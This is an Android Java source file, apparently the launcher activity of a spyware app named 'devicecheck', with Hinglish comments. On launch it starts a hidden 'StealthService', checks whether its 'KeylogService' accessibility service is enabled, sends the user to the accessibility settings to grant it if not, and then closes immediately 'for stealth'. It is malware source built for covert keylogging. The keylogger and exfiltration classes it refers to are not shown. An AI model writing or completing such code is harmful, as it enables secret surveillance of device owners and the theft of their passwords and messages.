package com.spy.devicecheck;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. Service start karo background ke liye
        startService(new Intent(this, StealthService.class));

        // 2. CHECK: Agar permission pehle se ON hai toh settings mat kholo
        if (!isAccessibilityEnabled(this)) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }

        // 3. App ko foran band (Close) kardo stealth ke liye
        finish();
    }

    // Yeh function check karega ki permission ON hai ya OFF
    private boolean isAccessibilityEnabled(Context context) {
        int accessibilityEnabled = 0;
        final String service = getPackageName() + "/" + KeylogService.class.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                context.getApplicationContext().getContentResolver(),
                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {}

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                context.getApplicationContext().getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                return settingValue.contains(service);
            }
        }
        return false;
    }
}
